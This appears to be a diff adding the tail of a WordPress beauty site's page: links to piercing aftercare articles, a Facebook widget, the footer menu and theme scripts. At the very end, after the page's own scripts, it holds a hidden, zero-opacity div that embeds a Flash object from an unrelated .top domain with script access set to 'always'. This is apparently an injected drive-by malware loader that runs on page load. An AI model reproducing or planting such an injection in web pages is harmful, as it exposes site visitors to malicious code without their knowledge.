+        <div class="td_module_6 td_module_wrap td-animation-stack td_module_no_thumb" itemscope itemtype="http://schema.org/Article">
+
+        
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/lip-piercing/lip-piercing-swelling-bleeding-healing-aftercare-how-to-clean-a-swollen/" rel="bookmark" title="Lip Piercing Swelling, Bleeding, Healing, Aftercare, How to Clean A Swollen Lip Piercing">Lip Piercing Swelling, Bleeding, Healing, Aftercare, How to Clean A Swollen...</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea Luara"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/tongue-piercing/tongue-piercing-swelling-healing-process-time-stages-and-pictures/" rel="bookmark" title="Tongue Piercing Swelling, Healing Process, Time, Stages and Pictures"><img width="" height="" itemprop="image" class="entry-thumb" src="" alt="" title="Tongue Piercing Swelling, Healing Process, Time, Stages and Pictures"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/tongue-piercing/tongue-piercing-swelling-healing-process-time-stages-and-pictures/" rel="bookmark" title="Tongue Piercing Swelling, Healing Process, Time, Stages and Pictures">Tongue Piercing Swelling, Healing Process, Time, Stages and Pictures</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kevin"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_6 td_module_wrap td-animation-stack td_module_no_thumb" itemscope itemtype="http://schema.org/Article">
+
+        
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/tongue-piercing/tongue-web-piercing-risks-pain-healing-swelling-aftercare/" rel="bookmark" title="Tongue Web Piercing, Under Tongue Risks, Pain, Healing, Swelling and Aftercare">Tongue Web Piercing, Under Tongue Risks, Pain, Healing, Swelling and Aftercare</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kevin"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/nose-piercing/nose-piercing-pain-nose-piercing-hurt/" rel="bookmark" title="Nose Piercing Pain, Does Nose Piercing Hurt"><img width="" height="" itemprop="image" class="entry-thumb" src="" alt="" title="Nose Piercing Pain, Does Nose Piercing Hurt"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/nose-piercing/nose-piercing-pain-nose-piercing-hurt/" rel="bookmark" title="Nose Piercing Pain, Does Nose Piercing Hurt">Nose Piercing Pain, Does Nose Piercing Hurt</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kevin"><meta itemprop="interactionCount" content="UserComments:1"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 --></div></div> <!-- ./block --><aside class="widget widget_text">			<div class="textwidget"><iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2FBeautyHows&amp;width=300&amp;height=290&amp;colorscheme=light&amp;show_faces=true&amp;header=true&amp;stream=false&amp;show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:300px; height:239px;" allowTransparency="true"></iframe>
+</div>
+		</aside>                                </div>
+                            </div>
+                                    </div> <!-- /.td-pb-row -->
+        </div>
+    </div> <!-- /.td-container -->
+
+<!-- Footer -->
+
+
+
+
+
+<!-- Sub Footer -->
+    <div class="td-sub-footer-container td-container td-container-border td-add-border">
+        <div class="td-pb-row">
+            <div class="td-pb-span4 td-sub-footer-copy">
+                <div class="td-pb-padding-side">
+                    &copy; 2015 Beautyhows                </div>
+            </div>
+
+            <div class="td-pb-span8 td-sub-footer-menu">
+                <div class="td-pb-padding-side">
+                    <div class="menu-top-menu-container"><ul id="menu-top-menu" class=""><li id="menu-item-8986" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-first td-menu-item td-normal-menu menu-item-8986"><a href="http://www.beautyhows.com/about-us/">About Us</a></li>
+<li id="menu-item-8987" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8987"><a href="http://www.beautyhows.com/about-us/advertise-with-us/">Advertise with Us</a></li>
+<li id="menu-item-8988" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8988"><a href="http://www.beautyhows.com/about-us/privacy-policy/">Privacy Policy</a></li>
+<li id="menu-item-8989" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8989"><a href="http://www.beautyhows.com/about-us/copyright/">Copyright</a></li>
+<li id="menu-item-8990" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8990"><a href="http://www.beautyhows.com/about-us/disclaimer/">Terms of Use</a></li>
+<li id="menu-item-8991" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8991"><a href="http://www.beautyhows.com/about-us/contact-us/">Contact Us</a></li>
+</ul></div>                </div>
+            </div>
+        </div>
+    </div>
+    </div><!--close content div-->
+</div><!--close td-outer-wrap-->
+
+
+
+
+
+    <!--
+
+        Theme: Newsmag by tagDiv 2015
+        Version: 1.7.1 (rara)
+        Deploy mode: deploy
+        
+        uid: 57c835eaa69d4
+    -->
+
+    <script type='text/javascript'>
+/* <![CDATA[ */
+var tocplus = {"smooth_scroll":"1","visibility_show":"show","visibility_hide":"hide","visibility_hide_by_default":"1","width":"Auto"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.beautyhows.com/wp-content/plugins/table-of-contents-plus/front.min.js?ver=1509'></script>
+<script type='text/javascript' src='http://www.beautyhows.com/wp-content/themes/Newsmag-tf/Newsmag/js/tagdiv_theme.js?ver=1.7.1'></script>
+<script type='text/javascript' src='http://www.beautyhows.com/wp-includes/js/comment-reply.min.js?ver=fb07fe5fda16be84d20479539d54af0d'></script>
+<script type='text/javascript' src='http://www.beautyhows.com/wp-includes/js/wp-embed.min.js?ver=fb07fe5fda16be84d20479539d54af0d'></script>
+<script type='text/javascript' src='http://www.beautyhows.com/wp-content/plugins/js_composer/assets/js/js_composer_front.js?ver=4.4.4'></script>
+
+<!-- JS generated by theme -->
+
+<script>
+    
+jQuery().ready(function() {
+jQuery(".td-big-grid-post .td-module-thumb a").addClass("td-image-gradient td-big-grid-overlay");
+});
+jQuery().ready(function() {
+jQuery(".td-big-grid-post .td-module-thumb a").addClass("td-image-gradient td-big-grid-overlay");
+});
+
+	
+		jQuery(window).load(function() {
+
+			// if the theme has td_animation_stack, initialize it
+			if (typeof window.td_animation_stack !== 'undefined') {
+				window.td_animation_stack.init();
+			}
+		});
+	
+
+	
+</script>
+
+  <body> <div style = "position: absolute;z-index:-1; left:297px; opacity:0;filter:alpha(opacity=0); -moz-opacity:0;">
+<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" id="tokuay" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width="33" height="40" align="middle" >
+<param name="allowScriptAccess" value="always"/><param name="movie" value="http://www.oheruci.top/elwxtirkme-oek7d-ofrpbokrcbskiammmsoltp9fnsfm2noamae-f-erbmnkspf7o-8b8s-lioap9pefitmd2ekf7lemdllrme-l9nclt/"/><param name="quality" value="high"/><param name="bgcolor" value="#ffffff"/><param name="wmode" value="opaque"/>
+<embed src="http://www.oheruci.top/elwxtirkme-oek7d-ofrpbokrcbskiammmsoltp9fnsfm2noamae-f-erbmnkspf7o-8b8s-lioap9pefitmd2ekf7lemdllrme-l9nclt/" quality="high" bgcolor="#ffffff"  name="tokuay" width="37" height="36" align="middle" allowScriptAccess="always" play="true" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" wmode="opaque"/></object>
+</div> </body>  
+</body>
+</html>
